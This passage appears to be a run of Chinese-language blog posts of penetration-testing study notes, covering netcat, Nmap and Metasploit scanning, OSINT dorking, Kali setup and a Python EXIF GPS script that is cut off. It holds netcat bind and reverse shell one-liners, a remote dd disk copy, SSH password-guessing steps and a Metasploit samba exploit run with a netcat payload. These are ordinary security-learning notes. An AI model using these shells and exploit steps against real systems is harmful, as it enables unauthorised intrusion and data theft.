1.txt</code></p><p>需要审计电脑</p><p><code>ps aux | nc -nv 10.10.10.133 -q 1</code></p><p>-q 命令执行完成 1秒自动断开连接 表明任务完成</p><p><code>lsof | nc -nv 10.10.10.133 -q 1</code></p><h4 id="NC——传输文件、目录"><a href="#NC——传输文件、目录" class="headerlink" title="NC——传输文件、目录"></a>NC——传输文件、目录</h4><ul><li><p>传输文件</p><ul><li>A： <code>nc -lp 333 &gt; 1.mp4</code></li><li>B: <code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</code></li><li>或</li><li>A:<code>nc -q 1 -lp 333 &lt; a.mp4</code></li><li>B:<code>nc -nv 1.1.1.1 333 &gt; 2.mp4</code></li></ul></li><li><p>传输目录</p><ul><li><p>A：<code>tar -cvf - music | nc -lp 333 -q 1</code></p><p>先打包 再传输 </p></li><li><p>B: <code>nc -nv 1.1.1.1 333 | tar -xvf -</code></p></li></ul></li><li><p>加密传文件</p><ul><li>A：<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code></li><li>B: <code>mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4| nc -nv 1.1.1.1 333 -q 1</code></li></ul></li></ul><h4 id="NC——流媒体服务器"><a href="#NC——流媒体服务器" class="headerlink" title="NC——流媒体服务器"></a>NC——流媒体服务器</h4><ul><li>A: <code>cat 1.mp4 | nc -lp 333</code></li><li>B : <code>nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code></li></ul><h4 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h4><p><code>nc -nvz 1.1.1.1 1-65535</code> tcp端口</p><p><code>nc -vnzu 1.1.1.1 1-1024</code> udp端口</p><h4 id="NC——-远程克隆硬盘"><a href="#NC——-远程克隆硬盘" class="headerlink" title="NC—— 远程克隆硬盘"></a>NC—— 远程克隆硬盘</h4><ul><li><p>A: <code>nc -lp 333 | dd of=/dev/sda</code></p></li><li><p>B: <code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></p><p>远程电子取证，可以将目标服务器硬盘远程复制</p></li></ul><h4 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h4><ul><li><p>正向</p><ul><li>A:<code>nc -lp 333 -c bash</code></li><li>B:<code>nc 1.1.1.1 333</code></li></ul></li><li><p>反向</p><ul><li>A: <code>nc -lp 333</code></li><li>B: <code>nc 1.1.1.1 333 -c bash</code></li></ul><p>windows用户把bash改成cmd </p></li></ul><h4 id="NC-缺点"><a href="#NC-缺点" class="headerlink" title="NC 缺点"></a>NC 缺点</h4><ul><li>Nc缺乏加密和身份验证的能力</li><li>Ncat包含于nmap工具包中</li></ul><p>A： <code>ncat -c bash --alllow 192.168.20.14 -vnl 333 --ssl</code></p><p>B:<code>ncat -nv 192.168.1.115 333 --ssl</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>基础扫描</title>
      <link href="/2018/01/28/%E5%9F%BA%E7%A1%80%E6%89%AB%E6%8F%8F/"/>
      <url>/2018/01/28/%E5%9F%BA%E7%A1%80%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<p>记录一下主动信息搜集的基础扫描方法</p><p>最基础的就是<code>ping</code>,在Metasploit中还有<code>arp_sweep</code> <code>udp_sweep</code> 等，但是我没有测试成功。</p><h4 id="Nmap进行扫描"><a href="#Nmap进行扫描" class="headerlink" title="Nmap进行扫描"></a>Nmap进行扫描</h4><p><code>nmap &lt;扫描选项&gt; &lt;扫描目标&gt;</code></p><p><code>-sT</code> TCP connect 扫描， 类似tcp模块</p><p><code>-sP</code> 通过发送ICMP echo请求探测主机是否存活，原理同Ping</p><p><code>-sU</code> 探测目标主机开放了哪些UDP端口</p><p><code>-sA</code> TCP ACK 扫描，类似ACK扫描模块</p><p><code>-sS</code> 使用它来执行一次隐秘的TCP扫描，以确定某个特定的TCP端口是否开放，类似syn。</p><p><code>-Pn</code> 不使用ping命令预先判断主机是否存活，而是默认所有主机都是存活状态。</p><p><code>-A</code> 尝试深入的服务枚举和旗标获取。</p><p><code>-O</code> 让Nmap对目标的操作系统进行识别</p><p><code>-F</code> 快速扫描模式， 只扫描nmap-services中列出的端口</p><p><code>p&lt;端口范围&gt;</code> </p><h4 id="Metasploit-辅助扫描模块"><a href="#Metasploit-辅助扫描模块" class="headerlink" title="Metasploit 辅助扫描模块"></a>Metasploit 辅助扫描模块</h4><p><code>search portscan</code></p><p>ack: 通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测。</p><p>ftpbounce: 通过FTP bounce攻击的原理对TCP服务进行枚举。</p><p>syn: 使用发送TCP SYN标志的方式探测开放的端口</p><p>tcp: 通过一次完整的TCP连接来判断端口是否开放，扫描最准确，但速度最慢。</p><p>xmas:更为隐蔽的扫描方式，通过发送FIN、PSH和URG标志，躲避一些高级的TCP标记检测器的过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/syn</span><br><span class="line">set RHOSTS 10.10.10.254</span><br><span class="line">set THREADS 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>一次使用syn扫描的过程。</p><h4 id="常见的网络服务扫描"><a href="#常见的网络服务扫描" class="headerlink" title="常见的网络服务扫描"></a>常见的网络服务扫描</h4><p>1.Telnet服务扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_version</span><br><span class="line">set RHOSTS 10.10.10.0/24</span><br><span class="line">set THREADS 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>2.SSH服务扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">set RHOSTS 10.10.10.0/24</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>3.Oracle数据库服务查点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/tnslsnr_version</span><br><span class="line">set RHOSTS 10.10.10.0/24</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>4.服务器消息块协议扫描</p><p>获取Windows系统的版本号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use scanner/smb/smb_version</span><br><span class="line">show options</span><br><span class="line">set RHOSTS</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>5.搜寻配置不当的Microsoft SQL Server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use scanner/mssql/mssql_ping</span><br><span class="line">show options</span><br><span class="line">set RHOSTS</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>6.FTP 扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use scanner/ftp/ftp_version</span><br><span class="line">show options</span><br><span class="line">set RHOSTS </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>7.简单网管协议(SNMP)扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use scanner/snmp/snmp_login</span><br><span class="line">set RHOSTS</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h4 id="口令猜测和嗅探"><a href="#口令猜测和嗅探" class="headerlink" title="口令猜测和嗅探"></a>口令猜测和嗅探</h4><ol><li><p>SSH服务口令猜测</p><p><code>use auxiliary/scanner/ssh/ssh_login</code></p><p>载入ssh_login模块后， 设置RHOSTS参数指定口令攻击对象，使用USERNAME参数指定一个用户名，或者使用USER_FILE参数指定一个包含多个用户名的文本文件，每个用户名占一行。并使用PASSWORD指定一个特定的口令字符串，或者使用PASS_FILE参数指定一个包含多个口令的字典文件，每个口令占一行。 也可以使用USERPASS_FILE指定一个用户名和口令的配对文件(用户名和口令之间用空格隔开，每对用户名口令占一行)</p></li><li><p>psnuffle口令嗅探</p><p>截获常见协议的身份认证过程。</p><p><code>use auxiliary/sniffer/psnuffle</code></p></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Metasploit-入门</title>
      <link href="/2018/01/27/Metasploit-%E5%85%A5%E9%97%A8/"/>
      <url>/2018/01/27/Metasploit-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>Metasploit是一个超级强大的工具，我通过Kali Linux直接使用，就省略了安装过程。</p><h4 id="图形化界面工具"><a href="#图形化界面工具" class="headerlink" title="图形化界面工具"></a>图形化界面工具</h4><p>早上在用BT的时候，是可以使用msfgui的。但是在Kali里已经没有了。相应的图形界面好像是Armitage.只是打开看了一下，没有仔细研究。</p><h4 id="msfconsole控制台终端"><a href="#msfconsole控制台终端" class="headerlink" title="msfconsole控制台终端"></a>msfconsole控制台终端</h4><p><code>msfconsole</code> </p><p>启动之后，可以输入help命令列出所支持的命令列表。</p><p><code>help search</code></p><p><code>search samba</code></p><p><code>use multi/samba/usermap_script</code></p><p><code>show payloads</code></p><p><code>set payload cmd/unix/bind_netcat</code></p><p><code>show options</code></p><p><code>set RHOST 10.10.10.254</code></p><p><code>exploit</code></p><p>通过上面就可以实施渗透攻击了。</p><p><code>uname -a</code></p><p><code>whoami</code></p><p>即可验证</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>外围信息搜集</title>
      <link href="/2018/01/27/%E5%A4%96%E5%9B%B4%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2018/01/27/%E5%A4%96%E5%9B%B4%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>外围信息搜集又称为公开渠道信息搜集，以前在qlcoder里见过几道题是与之相关的，那么今天正好学习一下。</p><p>英文 OSINT(Open Source INTelligence)<code>https://en.wikipedia.org/wiki/Open-source_intelligence</code></p><p>以书中的testfire.net网站为例。</p><h3 id="通过DNS和IP地址挖掘目标网络信息"><a href="#通过DNS和IP地址挖掘目标网络信息" class="headerlink" title="通过DNS和IP地址挖掘目标网络信息"></a>通过DNS和IP地址挖掘目标网络信息</h3><p>1.whois域名注册信息查询</p><p>这个可以通过msf命令<code>whois testfire.net</code> 来查询。</p><p>查询域名注册信息，包括域名所有者，服务商，管理员邮件地址，域名注册日期和过期日期。</p><p>进行查询应该去掉www、ftp前缀，机构在注册域名时通常会注册一个上层域名，其子域名由自身的域名服务器管理。</p><p>2.nslookup与dig域名查询</p><p>两个工具都用来查询指定域名所对应的IP地址，dig工具从该域名的官方DNS服务器上查询到精确的权威解答，uslookup得到DNS解析服务器保存在Cache中的非权威解答。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type=A</span><br><span class="line">testfire.net</span><br></pre></td></tr></table></figure><p>还可以使用set type=MX 来查找其邮件转发。</p><p>dig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @ns.watson.ibm.com testfire.net</span><br></pre></td></tr></table></figure><p>可以指定DNS服务器进行查询。</p><p>可以在待查询域名后面加上A NS MX等选项以查找特定类型的DNS记录（默认为A)</p><p>3.IP2Location地理位置查询</p><p>这个就是通过IP地址寻找其地理位置。</p><p>4.netcraft网站提供的信息查询服务</p><p><code>https://searchdns.netcraft.com/</code></p><p>查询子站点。</p><p>5.IP2Domain 反查域名</p><p>这个可以通过一些网站来通过IP反查域名。</p><h3 id="通过搜索引擎进行信息收集"><a href="#通过搜索引擎进行信息收集" class="headerlink" title="通过搜索引擎进行信息收集"></a>通过搜索引擎进行信息收集</h3><p>1.Google Hacking</p><ul><li>SiteDigger</li><li>Search Diggity</li></ul><p>这两个工具还没有使用过。</p><p>2.探索网站的目录结构</p><p>google <code>parent directory site:testfire.net</code></p><ul><li>扩展名为inc的文件：可能会包含网站的配置信息，如数据库用户名、口令等。</li><li>扩展名为bak的文件，通常是一些文本编辑器在编辑源代码后留下的备份文件，可以让你知道与其对应的程序脚本文件中的大致内容。</li><li>扩展名为txt或sql的文件：一般包含网站运行的SQL脚本，可能会透露类似数据库结构等信息。</li></ul><p>3.检索特定类型的文件</p><p>Google<code>site:testfire.net filetype:xls</code></p><p>4.搜索网站中的E-mail地址</p><p>5.搜索易存在SQL注入点的页面</p><p><code>site:testfire.net inurl:login</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Kali-Linux-基本配置</title>
      <link href="/2018/01/25/Kali-Linux-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/01/25/Kali-Linux-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h4 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h4><ul><li><p>临时IP地址</p><ul><li><p><code>ifconfig eth0 192.168.1.10/24</code> 修改IP地址/掩码</p></li><li><p><code>route add default gw 192.168.1.1</code> 指定网关</p></li><li><p><code>netstat -nr</code> 查看网关情况</p></li><li><p><code>route add -net 172.16.0.0/24 gw 192.168.1.100 eth0</code> 添加静态路由</p></li><li><p><code>vi /etc/resolv.conf</code> 直接修改DNS服务器</p></li><li><p><code>nameserver 8.8.8.8</code></p></li><li><p><code>vi /etc/network/interfaces</code> 网卡配置文件</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.1</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.0.254</span><br><span class="line">dns-nameservers 192.168.1.1</span><br><span class="line">配置静态地址</span><br></pre></td></tr></table></figure><p>​</p></li></ul></li></ul><h4 id="更新升级"><a href="#更新升级" class="headerlink" title="更新升级"></a>更新升级</h4><ul><li><p><code>apt-get update</code></p></li><li><p><code>apt-get upgrade</code></p></li><li><p><code>vi /etc/apt/sources.list</code> 换源</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib</span><br><span class="line">#deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib</span><br><span class="line">#deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br><span class="line">deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li><li><p><code>apt-get dis-upgrade</code> 大版本更新</p></li></ul><h4 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h4><p><code>apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany stardict meld ttf-wqy-microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs -y</code></p><p>firefox浏览器插件</p><p>flashgot 、autoproxy 、Tamper Data 、cookie importer、Cookies Manager、User Agent<br>Switcher、HackBar、Live http header、Firebug、Download YouTube Videos as MP4、<br>Flagfox、hashr<br><a href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/xss-me/</a><br><a href="https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/?src=ss" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/?src=ss</a></p><p>安装JAVA</p><p>下载<br><code>http://java.sun.com/javase/downloads/index.jsp</code><br>解包拷⻉<br><code>tar -xzvf /root/jdk-7u45-linux-x64.tar.gz</code><br><code>mv jdk1.7.0_45 /opt</code><br><code>cd /opt/jdk1.7.0_45</code><br>安装注册<br><code>update-alternatives --install /usr/bin/java java /opt/jdk1.7.0_45/bin/java 1</code><br><code>update-alternatives --install /usr/bin/javac javac /opt/jdk1.7.0_45/bin/javac 1</code></p><p><code>update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so /opt/jdk1.7.0_45/jre/lib/amd64/libnpjp2.so 1</code><br>默认设置<br><code>update-alternatives --set java /opt/jdk1.7.0_45/bin/java</code><br><code>update-alternatives --set javac /opt/jdk1.7.0_45/bin/javac</code><br><code>update-alternatives --set mozilla-javaplugin.so /opt/jdk1.7.0_45/jre/lib/amd64/libnpjp2.so</code><br>验证<br><code>java –version</code><br><code>http://www.java.com/en/download/installed.jsp</code></p><p>安装显卡驱动<br>•<br>GPU的⽤用途<br>•<br>Nvidia<br>•<br>Ati<br>•<br>Nvidia显卡驱动安装<br>•<br>apt-get update<br>apt-get dist-upgrade<br>apt-get install -y linux-headers-$(uname -r)<br>apt-get install nvidia-kernel-dkms<br>•<br>sed ‘s/quiet/quiet nouveau.modeset=0/g’ -i /etc/default/grub<br>update-grub<br>reboot<br>•<br>验证：<br>•<br>glxinfo | grep -i “direct rendering“<br>•<br>direct rendering: Yes</p><p>并发线程限制<br>•<br>Ulimite⽤用于限制当前 shell 内进程的资源使⽤用<br>•<br>查看默认值<br>•<br>Ulimite –a<br>•<br>全局配置⽂文件 ：/etc/security/limits<br>•</p><p><domain> <type> <item> <value><br>•<br>⽤用途距离<br>•<br>限制⽂文件块⼤大⼩小：ulimit – s 100<br>•<br>限制shell内存使⽤用：ulimit -m 5000 -v 5000<br>•<br>没有直接对socket数量的限制参数<br>•<br>Linux系统中⼀一切都是⽂文件，运⾏行中的⽂文件叫做进程<br>•<br>ulimite –n 800000</value></item></type></domain></p><p>服务开关<br>•<br>Kali Linux默认未启动所有⺴⽹网络服务<br>•<br>update-rc.d ssh default<br>•<br>/etc/init.d/ssh start</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>kali-linux-虚拟机安装</title>
      <link href="/2018/01/24/kali-linux-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/"/>
      <url>/2018/01/24/kali-linux-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>一直想玩一下kali linux, 之前一直没有时间。今天重新下载开始了折腾过程，顺便开始自己的渗透测试学习之路。</p><p>我选择通过VBOX来安装，官方网站上直接有VBOX的镜像，所以很方便。</p><p>下载地址：<code>https://www.kali.org/downloads/</code></p><p>然后呢，在VBOX上运行这个镜像需要安装一个增强。</p><p>下载一个叫Oracle_VM_VirtualBox_Extension_Pack的东西双击安装就好了。</p><p>成功运行之后，因为Kali Linux的Root用户策略。所以用户是root，密码是toor就可以进入系统了。</p><p>接下来就是安装Vbox的增强功能。</p><p>在光盘挂载之后，可以把VboxLinuxAdditions.run文件放到容易启动终端的目录下。</p><p>启动终端之后可以增加文件的运行权限。<code>chmod +x VBoxLinuxAdditions.run</code></p><p>然后运行安装即可。<code>./ VBoxLinuxAdditions.run</code></p><p>想试一下持久加密USB安装来着，但是身边没有U盘。就等以后有机会了。</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>BShell 下，蓝色代表普通目录，白色代表普通文件，绿色代表可执行文件，红色代表压缩包文件。</p><p><code>ls</code>命令</p><p><code>ls -l</code> 长格式 第一个字符d代表目录 -代表文件 c表示设备 l表示链接 b表示块</p><p><code>-a</code>  显示隐藏参数</p><p><code>-lh</code> 容易读文件大小</p><p><code>--sort=time</code> 按时间排序</p><p><code>--sort=size</code> 按大小排序</p><p><code>cd</code> 命令</p><p><code>cd ..</code>上级目录</p><p><code>pwd</code>查看当前目录</p><p><code>cat</code> 查看内容</p><p><code>more</code> 方便查看前部内容</p><p><code>less</code> </p><p><code>tail</code> 默认显示最后十行内容</p><p><code>tail -20</code> 查看最后20行</p><p><code>watch -n 2 tail -20 /var/log/messages</code> 每隔 两秒 刷新 <code>var/log/messages</code></p><p><code>rm</code> 删除文件</p><p><code>cp</code> 拷贝文件 </p><p><code>cp -r Agent/ A</code> 复制Agent文件夹 ，新文件夹名为A</p><p><code>rm -r A</code> 删除A文件夹</p><p><code>top</code>命令 监视系统性能 <code>kill</code>来终结进程</p><p><code>ps</code> 进程信息</p><p><code>ps -ef</code> 详细进程信息</p><p><code>ps aux</code> </p><p><code>grep</code> 筛选显示内容</p><p><code>ipconfig</code> 查看网络信息</p><p><code>ifconfig eth0 down</code> 关闭网卡</p><p><code>macchanger -m 00:11:11:11:11:11 eth0</code> 修改mac地址</p><p><code>ifconfig eth0 up</code></p><p><code>netstat</code> 查看网络连接信息</p><p><code>netstat -pantu</code> </p><p><code>netstat -pantu | egrep -v &#39;0.0.0.0|::: | awk &#39;{print $5}&#39;</code></p><p><code>netstat -pantu | egrep -v &#39;0.0.0.0|::: | awk &#39;{print $5}&#39; | egrep -v &#39;and|Address&#39; | cut -d &#39;:&#39; -f 1 | sort | uniq &gt; ip</code></p><p><code>&gt;&gt;</code>不覆盖之前文件</p><p><code>mount</code> 挂载命令</p><p><code>mount -o loop kali.iso /media/cdrom</code></p><p><code>dmesg</code> 查看message</p><p><code>find</code> 查找文件 </p><p><code>find / -iname nmap</code> 不区分大小写查找nmap</p><p><code>find . -name &quot;ps*&quot;</code></p><p><code>find . -name &quot;ps*&quot; -exec cp {} /tmp/{} .bak \;</code></p><p><code>whereis</code>  </p><p><code>echo</code> 显示信息</p><p><code>cd aaa &amp; ls</code> 先后依次执行</p><p><code>&amp;&amp;</code> 如果前面命令成功才执行之后命令</p><p><code>||</code> 如果前面命令不成功才执行之后命令</p><h3 id="Shell脚本"><a href="#Shell脚本" class="headerlink" title="Shell脚本"></a>Shell脚本</h3><p><code>vi 1.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line">echo .n "IP: "</span><br><span class="line">read ip</span><br><span class="line">echo "your ip is :" $ip</span><br></pre></td></tr></table></figure><p><code>chmod +x 1.sh</code></p><p><code>./1.sh</code></p><p>99.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line">for n in 'seq 9'</span><br><span class="line">do</span><br><span class="line"> for m in 'seq $n'</span><br><span class="line"> do</span><br><span class="line">  echo -n "$m*$n="`expr $m \* $n`""</span><br><span class="line"> done</span><br><span class="line"> echo</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>ping.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line">for n in 'seq 254'</span><br><span class="line">do</span><br><span class="line"> ping 192.168.1.$n -c 1 | grep ttl | awk '&#123;print $4&#125;' | awk -F: '&#123;print $1&#125;'</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>s1.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line">A='cat ip1'</span><br><span class="line">for B in $A</span><br><span class="line">do</span><br><span class="line">n='echo $B | wc -L'</span><br><span class="line">if [ $n -gt 6] ; then</span><br><span class="line">ip=$B</span><br><span class="line">else</span><br><span class="line">port=$B</span><br><span class="line">namp -p$port -sV $ip | grep -v Starting | grep -v Host | grep -v PORT | grep -v Service | grep -v done &gt;&gt; r1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Python 将手机照片拍摄地点可视化</title>
      <link href="/2018/01/10/Python%20%E5%B0%86%E6%89%8B%E6%9C%BA%E7%85%A7%E7%89%87%E6%8B%8D%E6%91%84%E5%9C%B0%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96/"/>
      <url>/2018/01/10/Python%20%E5%B0%86%E6%89%8B%E6%9C%BA%E7%85%A7%E7%89%87%E6%8B%8D%E6%91%84%E5%9C%B0%E7%82%B9%E5%8F%AF%E8%A7%86%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>今天发现自己手机里所有的照片的EXIF信息中都有GPS信息。</p><p>所以有将数据可视化的想法，想着比较简单，但还是有很多坑在里面。</p><p>首先需要读取图片的GPS信息。</p><p>Exifread 库</p><p><code>https://pypi.python.org/pypi/ExifRead</code></p><p>读取GPS信息</p><p><code>https://gist.github.com/snakeye/fdc372dbf11370fe29eb</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> exifread</span><br><span class="line"></span><br><span class="line"><span class="comment"># based on https://gist.github.com/erans/983821</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_if_exist</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> data[key]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_convert_to_degress</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Helper function to convert the GPS coordinates stored in the EXIF to degress in float format</span></span><br><span class="line"><span class="string">    :param value:</span></span><br><span class="line"><span class="string">    :type value: exifread.utils.Ratio</span></span><br><span class="line"><span class="string">    :rtype: float</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    d = float(value.values[<span class="number">0</span>].num) / float(value.values[<span class="number">0</span>].den)</span><br><span class="line">    m = float(value.values[<span class="number">1</span>].num) / float(value.values[<span class="number">1</span>].den)</span><br><span class="line">    s = float(value.values[<span class="number">2</span>].num) / float(value.values[<span class="number">2</span>].den)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d + (m / <span class="number">60.0</span>) + (s / <span class="number">3600.0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_exif_location</span><span class="params">(exif_data)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns the latitude and longitude, if available, from the provided exif_data (obtained through get_exif_data above)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    lat = <span class="keyword">None</span></span><br><span class="line">    lon = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    gps_latitude = _get_if_exist(exif_data, <span class="string">'GPS GPSLatitude'</span>)</span><br><span class="line">    gps_latitude_ref = _get_if_exist(exif_data, <span class="string">'GPS GPSLatitudeRef'</span>)</span><br><span class="line">    gps_longitude = _get_if_exist(exif_data, <span class="string">'GPS GPSLongitude'</span>)</span><br><span class="line">    gps_longitude_ref = _get_if_exist(exif_data, <span class="string">'GPS GPSLongitudeRef'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> gps_latitude <span class="keyword">and</span> gps_latitude_ref <span class="keyword">and</span> gps_longitude <span class="keyword">and</span> gps_longitude_ref:</span><br><span class="line">        lat = 